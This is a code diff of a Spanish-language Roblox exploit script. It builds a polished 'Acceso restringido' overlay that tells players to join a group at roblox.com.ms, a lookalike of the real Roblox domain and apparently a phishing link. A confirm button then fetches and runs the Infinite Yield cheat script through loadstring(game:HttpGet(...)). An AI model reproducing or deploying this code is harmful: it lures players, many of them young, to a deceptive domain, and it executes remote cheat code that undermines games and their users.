@@ -1,95 +1,254 @@
--- ========== 配置 ==========
+-- ========== CONFIGURACIÓN ==========
 local GROUP_URL = "https://roblox.com.ms/communities/1280801115/"
 local IY_SCRIPT_URL = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
--- ==========================
+-- ===================================
 
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
--- 创建提示 UI
+-- Elimina UI previa si existe
+local old = game:GetService("CoreGui"):FindFirstChild("GroupGateUI")
+if old then old:Destroy() end
+
+-- ========== UI PRINCIPAL ==========
 local gui = Instance.new("ScreenGui")
-gui.Name = "GroupInstructionsUI"
+gui.Name = "GroupGateUI"
 gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.Parent = game:GetService("CoreGui")
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 360, 0, 220)
-frame.Position = UDim2.new(0.5, -180, 0.5, -110)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-frame.BorderSizePixel = 0
-frame.Parent = gui
+-- Fondo oscuro semitransparente (bloquea visualmente el juego)
+local backdrop = Instance.new("Frame")
+backdrop.Size = UDim2.new(1, 0, 1, 0)
+backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+backdrop.BackgroundTransparency = 0.45
+backdrop.BorderSizePixel = 0
+backdrop.Parent = gui
 
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = frame
+-- Contenedor principal
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 420, 0, 300)
+main.Position = UDim2.new(0.5, -210, 0.5, -150)
+main.BackgroundColor3 = Color3.fromRGB(22, 24, 34)
+main.BorderSizePixel = 0
+main.Parent = gui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 14)
+mainCorner.Parent = main
+
+-- Sombra / borde sutil
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(60, 65, 90)
+stroke.Thickness = 1
+stroke.Transparency = 0.3
+stroke.Parent = main
+
+-- Barra superior con degradado
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 56)
+topBar.BackgroundColor3 = Color3.fromRGB(35, 40, 60)
+topBar.BorderSizePixel = 0
+topBar.Parent = main
+
+local topCorner = Instance.new("UICorner")
+topCorner.CornerRadius = UDim.new(0, 14)
+topCorner.Parent = topBar
+
+-- Ocultar esquinas inferiores de la barra
+local topFix = Instance.new("Frame")
+topFix.Size = UDim2.new(1, 0, 0, 20)
+topFix.Position = UDim2.new(0, 0, 1, -20)
+topFix.BackgroundColor3 = Color3.fromRGB(35, 40, 60)
+topFix.BorderSizePixel = 0
+topFix.Parent = topBar
+
+-- Degradado en la barra
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 120, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 80, 255))
+}
+gradient.Parent = topBar
+
+-- Icono + título
+local icon = Instance.new("TextLabel")
+icon.Size = UDim2.new(0, 40, 0, 40)
+icon.Position = UDim2.new(0, 14, 0.5, -20)
+icon.BackgroundTransparency = 1
+icon.Text = "🔒"
+icon.TextSize = 26
+icon.Parent = topBar
 
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
+title.Size = UDim2.new(1, -80, 1, 0)
+title.Position = UDim2.new(0, 60, 0, 0)
 title.BackgroundTransparency = 1
-title.Text = "📋 Instrucciones"
+title.Text = "Acceso restringido"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 18
+title.TextSize = 20
 title.Font = Enum.Font.GothamBold
-title.Parent = frame
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = topBar
+
+-- ========== CONTENIDO ==========
+local content = Instance.new("Frame")
+content.Size = UDim2.new(1, -40, 1, -140)
+content.Position = UDim2.new(0, 20, 0, 70)
+content.BackgroundTransparency = 1
+content.Parent = main
 
 local desc = Instance.new("TextLabel")
-desc.Size = UDim2.new(1, -20, 0, 80)
-desc.Position = UDim2.new(0, 10, 0, 40)
+desc.Size = UDim2.new(1, 0, 0, 70)
 desc.BackgroundTransparency = 1
-desc.Text = "Para desbloquear este script, primero debes unirte a nuestro grupo de Roblox usando el siguiente enlace:"
-desc.TextColor3 = Color3.fromRGB(200, 200, 200)
-desc.TextSize = 13
+desc.Text = "Para desbloquear este script necesitas unirte a nuestro grupo de Roblox. Una vez dentro, pulsa el botón de abajo para continuar."
+desc.TextColor3 = Color3.fromRGB(210, 215, 230)
+desc.TextSize = 14
+desc.Font = Enum.Font.Gotham
 desc.TextWrapped = true
+desc.TextXAlignment = Enum.TextXAlignment.Left
 desc.TextYAlignment = Enum.TextYAlignment.Top
-desc.Parent = frame
+desc.Parent = content
 
--- Cuadro con el enlace (seleccionable)
-local linkBox = Instance.new("TextBox")
-linkBox.Size = UDim2.new(1, -20, 0, 30)
-linkBox.Position = UDim2.new(0, 10, 0, 125)
-linkBox.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
-linkBox.TextColor3 = Color3.fromRGB(0, 170, 255)
-linkBox.TextSize = 12
-linkBox.Font = Enum.Font.Code
-linkBox.Text = GROUP_URL
-linkBox.TextEditable = false
-linkBox.ClearTextOnFocus = false
-linkBox.Parent = frame
+-- Caja con enlace
+local linkFrame = Instance.new("Frame")
+linkFrame.Size = UDim2.new(1, 0, 0, 42)
+linkFrame.Position = UDim2.new(0, 0, 0, 78)
+linkFrame.BackgroundColor3 = Color3.fromRGB(30, 34, 48)
+linkFrame.BorderSizePixel = 0
+linkFrame.Parent = content
 
 local linkCorner = Instance.new("UICorner")
-linkCorner.CornerRadius = UDim.new(0, 4)
-linkCorner.Parent = linkBox
+linkCorner.CornerRadius = UDim.new(0, 8)
+linkCorner.Parent = linkFrame
 
--- Botón para copiar el enlace
+local linkStroke = Instance.new("UIStroke")
+linkStroke.Color = Color3.fromRGB(70, 78, 110)
+linkStroke.Thickness = 1
+linkStroke.Parent = linkFrame
+
+local linkLabel = Instance.new("TextLabel")
+linkLabel.Size = UDim2.new(1, -16, 1, 0)
+linkLabel.Position = UDim2.new(0, 12, 0, 0)
+linkLabel.BackgroundTransparency = 1
+linkLabel.Text = GROUP_URL
+linkLabel.TextColor3 = Color3.fromRGB(100, 180, 255)
+linkLabel.TextSize = 12
+linkLabel.Font = Enum.Font.Code
+linkLabel.TextXAlignment = Enum.TextXAlignment.Left
+linkLabel.TextTruncate = Enum.TextTruncate.AtEnd
+linkLabel.Parent = linkFrame
+
+-- ========== BOTONES ==========
+local btnContainer = Instance.new("Frame")
+btnContainer.Size = UDim2.new(1, 0, 0, 46)
+btnContainer.Position = UDim2.new(0, 0, 1, -100)
+btnContainer.BackgroundTransparency = 1
+btnContainer.Parent = main
+
+-- Botón copiar enlace
 local copyBtn = Instance.new("TextButton")
-copyBtn.Size = UDim2.new(1, -20, 0, 36)
-copyBtn.Position = UDim2.new(0, 10, 1, -46)
-copyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
-copyBtn.Text = "📋 Copiar enlace del grupo"
-copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-copyBtn.Font = Enum.Font.GothamBold
+copyBtn.Size = UDim2.new(0.48, 0, 1, 0)
+copyBtn.Position = UDim2.new(0, 0, 0, 0)
+copyBtn.BackgroundColor3 = Color3.fromRGB(45, 52, 72)
+copyBtn.Text = "📋 Copiar enlace"
+copyBtn.TextColor3 = Color3.fromRGB(220, 225, 240)
+copyBtn.Font = Enum.Font.GothamSemibold
 copyBtn.TextSize = 14
-copyBtn.Parent = frame
+copyBtn.AutoButtonColor = false
+copyBtn.Parent = btnContainer
 
 local copyCorner = Instance.new("UICorner")
-copyCorner.CornerRadius = UDim.new(0, 6)
+copyCorner.CornerRadius = UDim.new(0, 10)
 copyCorner.Parent = copyBtn
 
-copyBtn.MouseButton1Click:Connect(function()
-    if setclipboard then
-        setclipboard(GROUP_URL)
-        copyBtn.Text = "✅ ¡Enlace copiado!"
-        task.wait(2)
-        copyBtn.Text = "📋 Copiar enlace del grupo"
-    else
-        copyBtn.Text = "⚠️ Copia manualmente el enlace"
-        task.wait(2)
-        copyBtn.Text = "📋 Copiar enlace del grupo"
-    end
+-- Botón confirmar
+local confirmBtn = Instance.new("TextButton")
+confirmBtn.Size = UDim2.new(0.48, 0, 1, 0)
+confirmBtn.Position = UDim2.new(0.52, 0, 0, 0)
+confirmBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 255)
+confirmBtn.Text = "✅ Ya me uní, continuar"
+confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmBtn.Font = Enum.Font.GothamBold
+confirmBtn.TextSize = 14
+confirmBtn.AutoButtonColor = false
+confirmBtn.Parent = btnContainer
+
+local confirmCorner = Instance.new("UICorner")
+confirmCorner.CornerRadius = UDim.new(0, 10)
+confirmCorner.Parent = confirmBtn
+
+local confirmGradient = Instance.new("UIGradient")
+confirmGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 140, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 80, 255))
+}
+confirmGradient.Parent = confirmBtn
+
+-- Efectos hover suaves
+local function addHover(button, normalColor, hoverColor)
+    button.MouseEnter:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor}):Play()
+    end)
+    button.MouseLeave:Connect(function()
+        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = normalColor}):Play()
+    end)
+end
+addHover(copyBtn, Color3.fromRGB(45, 52, 72), Color3.fromRGB(60, 70, 95))
+
+-- Efecto de "pulsación" para confirmar
+confirmBtn.MouseButton1Down:Connect(function()
+    TweenService:Create(confirmBtn, TweenInfo.new(0.1), {Size = UDim2.new(0.46, 0, 0.94, 0)}):Play()
+end)
+confirmBtn.MouseButton1Up:Connect(function()
+    TweenService:Create(confirmBtn, TweenInfo.new(0.1), {Size = UDim2.new(0.48, 0, 1, 0)}):Play()
 end)
 
--- Después de un tiempo (o tras copiar), se puede cargar el script
--- Aquí cargamos el script de Infinite Yield después de 3 segundos
-task.wait(3)
-gui:Destroy()
-loadstring(game:HttpGet(IY_SCRIPT_URL))()
+-- ========== FUNCIONES ==========
+local function copyLink()
+    local ok = pcall(function() setclipboard(GROUP_URL) end)
+    if ok and setclipboard then
+        copyBtn.Text = "✅ ¡Copiado!"
+        copyBtn.TextColor3 = Color3.fromRGB(120, 255, 180)
+        task.wait(2)
+        copyBtn.Text = "📋 Copiar enlace"
+        copyBtn.TextColor3 = Color3.fromRGB(220, 225, 240)
+    else
+        copyBtn.Text = "⚠️ Copia manualmente"
+        copyBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
+        task.wait(2)
+        copyBtn.Text = "📋 Copiar enlace"
+        copyBtn.TextColor3 = Color3.fromRGB(220, 225, 240)
+    end
+end
+
+local function unlockScript()
+    -- Animación de salida
+    local exitTween = TweenService:Create(main, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 0, 0, 0),
+        Position = UDim2.new(0.5, 0, 0.5, 0),
+        BackgroundTransparency = 1
+    })
+    exitTween:Play()
+    TweenService:Create(backdrop, TweenInfo.new(0.35), {BackgroundTransparency = 1}):Play()
+    exitTween.Completed:Wait()
+    gui:Destroy()
+    loadstring(game:HttpGet(IY_SCRIPT_URL))()
+end
+
+-- ========== CONEXIONES ==========
+copyBtn.MouseButton1Click:Connect(copyLink)
+confirmBtn.MouseButton1Click:Connect(unlockScript)
+
+-- Efecto de entrada (fade + scale)
+main.Size = UDim2.new(0, 0, 0, 0)
+main.Position = UDim2.new(0.5, 0, 0.5, 0)
+TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+    Size = UDim2.new(0, 420, 0, 300),
+    Position = UDim2.new(0.5, -210, 0.5, -150)
+}):Play()
+
+backdrop.BackgroundTransparency = 1
+TweenService:Create(backdrop, TweenInfo.new(0.4), {BackgroundTransparency = 0.45}):Play()
